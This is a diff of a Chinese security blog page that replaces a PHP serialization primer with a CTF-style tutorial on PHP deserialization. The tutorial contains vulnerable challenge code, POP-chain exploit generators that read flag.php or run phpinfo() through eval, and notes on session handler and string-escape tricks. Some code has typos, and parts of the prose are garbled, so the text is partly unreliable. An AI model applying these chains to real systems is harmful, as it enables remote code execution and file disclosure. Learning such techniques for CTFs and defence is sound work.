@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php序列化和反序列化, Hbluewhite的Blog">
+    <meta name="keywords" content="php反序列化（phar://）, Hbluewhite的Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php序列化和反序列化 | Hbluewhite的Blog</title>
+    <title>php反序列化（phar://） | Hbluewhite的Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -356,12 +356,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php序列化和反序列化</h1>
+                    <h1 class="description center-align post-title">php反序列化（phar://）</h1>
                 </div>
             </div>
         </div>
@@ -493,7 +493,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-12
+                    2021-09-14
                 </div>
                 
 
@@ -514,31 +514,45 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="PHP序列化和反序列化"><a href="#PHP序列化和反序列化" class="headerlink" title="PHP序列化和反序列化"></a>PHP序列化和反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>在php文件中，我们需要将变量存储在数据库中，我们需要将变量序列化转换为字符串的过程。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class man&#123;</span><br><span class="line"> public $name;</span><br><span class="line"> public $age;</span><br><span class="line"> public $height;</span><br><span class="line"> </span><br><span class="line"> function __construct($name,$age,$height)&#123;        //_construct：创建对象时初始化</span><br><span class="line">  $this-&gt;name = $name;</span><br><span class="line">  $this-&gt;age = $age;</span><br><span class="line">  $this-&gt;height = $height;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$man=new man(&quot;Bob&quot;,5,20);</span><br><span class="line">var_dump(serialize($man));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+                <h1 id="php序列化和反序列化"><a href="#php序列化和反序列化" class="headerlink" title="php序列化和反序列化"></a>php序列化和反序列化</h1><h2 id="pop链和phar-协议"><a href="#pop链和phar-协议" class="headerlink" title="pop链和phar://协议"></a>pop链和phar://协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">error_reporting(1);</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $content = $this-&gt;file_get($this-&gt;var);</span><br><span class="line">        echo $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo $this-&gt;source.&#x27;Welcome&#x27;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&#x27;hacker&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;hello&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[&#x27;hello&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $show = new Show(&#x27;pop3.php&#x27;);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>输出</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(67) &quot;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:5;s:6:&quot;height&quot;;i:</span><br></pre></td></tr></table></figure>
+<p>上面是一个flag.php的源码</p>
+<ol>
+<li>首先看到unserialize($_GET[‘hello’])将get传参的hello进行了反序列化操作。那么将会调用到Show类中__wakeup方法。（在反序列化时进行调用）</li>
+<li>因为this -&gt; source = “index.php” source被当作字符串所以调用Show类中的_to string.</li>
+<li><code>return $this-&gt;str[&#39;str&#39;]-&gt;source</code>source属性不存在所以调用Test类中的get方法。</li>
+<li><code>$function = $this-&gt;p; return $function;</code>把取出来的p当作还是调用因此优惠引起调用了Read类中_invoke方法，其中还就可以把文件读取出来了。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Show&#123;</span><br><span class="line">	public $source;</span><br><span class="line">	public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">	public $p;</span><br><span class="line">&#125;</span><br><span class="line">class Read&#123;</span><br><span class="line">	publc $var = &quot;flag.php&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = new Show();</span><br><span class="line">$t = new Test();</span><br><span class="line">$r = new Read();</span><br><span class="line">$t -&gt; p = $r;</span><br><span class="line">$s -&gt;str[&quot;str&quot;] = $t;</span><br><span class="line">$s -&gt; source = $s;</span><br><span class="line">var_dump(serialize($s));</span><br></pre></td></tr></table></figure>
 
-<p>如图这就是个序列化的过程。</p>
-<p>在我们看到序列化输出以后我们需要了解相应字符的意思</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O 对象</span><br><span class="line">s 字符串</span><br><span class="line">i 整型数据</span><br><span class="line">d double型数据</span><br></pre></td></tr></table></figure>
+<p>还有一个简单的例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        //$obj = new test1; 这里可以控制$obj为任意对象</span><br><span class="line">        $this-&gt;obj-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test1&#123;</span><br><span class="line">    function a()&#123;</span><br><span class="line">        echo &quot;123&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test2&#123;</span><br><span class="line">    private $data;</span><br><span class="line">    function a()&#123;</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>其实大部分都是根据首字母的意思和各个编程语言是语言是一样的</p>
-<h3 id="序列化函数"><a href="#序列化函数" class="headerlink" title="序列化函数"></a>序列化函数</h3><p><strong>serialize</strong>：没错序列化就是这个函数，在官方定义了这个函数</p>
-<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="定义：-1"><a href="#定义：-1" class="headerlink" title="定义："></a>定义：</h3><p>反序列化也就是将字符串转换为变量的逆过程。</p>
-<h3 id="反序列化函数"><a href="#反序列化函数" class="headerlink" title="反序列化函数"></a>反序列化函数</h3><p><strong>unserialize</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class man&#123;</span><br><span class="line"> public $name;</span><br><span class="line"> public $age;</span><br><span class="line"> public $height;</span><br><span class="line"> </span><br><span class="line"> function __construct($name,$age,$height)&#123;</span><br><span class="line">  $this-&gt;name = $name;</span><br><span class="line">  $this-&gt;age = $age;</span><br><span class="line">  $this-&gt;height = $height;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$man= &#x27;O:3:&quot;man&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:5;s:6:&quot;height&quot;;i:20;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($man));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>利用的pop链。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">class OowoO&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;obj = new test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class test2&#123;</span><br><span class="line">    private $data = &quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new OowoO()));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<p>输出</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(man)#1 (3) &#123;</span><br><span class="line">  [&quot;name&quot;]=&gt;</span><br><span class="line">  string(3) &quot;Bob&quot;</span><br><span class="line">  [&quot;age&quot;]=&gt;</span><br><span class="line">  int(5)</span><br><span class="line">  [&quot;height&quot;]=&gt;</span><br><span class="line">  int(20)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="https://img2020.cnblogs.com/blog/1937992/202006/1937992-20200601123243831-993781483.png" alt="img"></p>
+<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>session主要就是一个存取对话信息或者通话的变量，一般session的值session.save_handler来进行存储的。</p>
+<p>关于session的存储，java是将用户的session存入内存中，而php则是将session以文件的形式存储在服务器某个tmp文件中，可以在php.ini里面设置session.save_path存储的位置</p>
+<ol>
+<li>session.serialize_handler = php序列化的结果</li>
+</ol>
+<p><img src="https://img2018.cnblogs.com/blog/1419450/201903/1419450-20190301153453970-831696609.png" alt="img"></p>
+<p>它的规则是$_SESSION是个数组，数组中的键和值中间用 | 来分割，值如果是数组或对象按照序列化的格式存储</p>
+<p>session.serialize_handler = php_serialize的序列化结果</p>
+<p><img src="https://img2018.cnblogs.com/blog/1419450/201903/1419450-20190301153731026-2081840128.png" alt="img"></p>
+<p>它是全程按照serialize的格式序列化了$_SESSION这个数组</p>
+<p>它比php的格式多了个最前面多了个 “a:2:{ ….” 也就是$_SESSION这个数组有2个元素，还有个区别在于，它的键名也表明了长度和属性，中间用 ; 来隔开键值对</p>
+<h3 id="储存溢出"><a href="#储存溢出" class="headerlink" title="储存溢出"></a>储存溢出</h3><p>PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项 session.save_handler 来 进行确定的，默认是以文件的方式储存。储存的文件是以 sess_PHPSESSID 来进行命名的，文件的内容 就是session值得序列化之后得内容。</p>
+<h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>序列化对象中字符串的长度，只能反序列化相应长度的字，不能进行闭合。</p>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:0;s:3:&quot;123&quot;;&#125;???</span><br><span class="line">a:1:&#123;i:0;s:3:&quot;123&quot;;&#125;;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>再一次就要提到以下的东西</p>
-<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_construct()：创建对象时初始化</span><br><span class="line">_destruction()：结束时销毁对象</span><br><span class="line">_toString()：对象被当作字符串时使用</span><br><span class="line">_sleep()：序列化对象之前调用</span><br><span class="line">_wakeup()：反序列化之前调用</span><br><span class="line">_call()：调用对象不存在时使用</span><br><span class="line">_get()：调用私有属性时使用</span><br><span class="line">_set(): 用于数据写入补课访问的属性</span><br><span class="line">_isset(): 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">_unset()：在补课访问的属性上使用unset()时触发</span><br><span class="line">_invoke(): 当甲苯尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
-
-<p>在序列化和反序列化中，有这样一些魔法函数在相对应的时候会执行相应的函数，我们网络安全中，反序列化漏洞就是可以通过这些魔法函数来进行。</p>
-<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p>
-<p>一般程序在创建的时候，都会重写析构函数和构造函数，反序列化就是利用这些重写的函数。</p>
+<p>根据反序列化我们可以看到上面之后的反序列话是一样的，所以在做相应的题目时，我们可以通过字符串溢出来进行编码</p>
+<p>一般会有一个函数或者方法将字符串改变</p>
+<p>例如：</p>
+<p>将flag换成index，长度就加一上面的遇到这类型，我们都可以用字符串溢出的方式来进行反序列化获取参数。</p>
 
                 
             </div>
@@ -565,7 +579,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/09/12/%E2%80%9Cphp%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2021/09/12/%E2%80%9Cphp%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+                    <a href="http://example.com/2021/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88phar-%EF%BC%89/">http://example.com/2021/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88phar-%EF%BC%89/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1042,9 +1056,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/09/14/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88phar-%EF%BC%89/">
                     <div class="card-image">
@@ -1062,9 +1077,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-14
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1073,6 +1088,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1091,13 +1107,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/11/SSRF%E9%A2%98%E8%A7%A3%EF%BC%882%EF%BC%89/">
+                <a href="/2021/09/12/%E2%80%9Cphp%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.png" class="responsive-img" alt="SSRF题解（2）">
+                        <img src="/medias/featureimages/11.png" class="responsive-img" alt="php序列化和反序列化">
                         
-                        <span class="card-title">SSRF题解（2）</span>
+                        <span class="card-title">php序列化和反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1108,7 +1124,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-12
                             </span>
                         <span class="publish-author">
                             
@@ -1121,8 +1137,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SSRF/">
-                        <span class="chip bg-color">SSRF</span>
+                    <a href="/tags/php/">
+                        <span class="chip bg-color">php</span>
                     </a>
                     
                 </div>
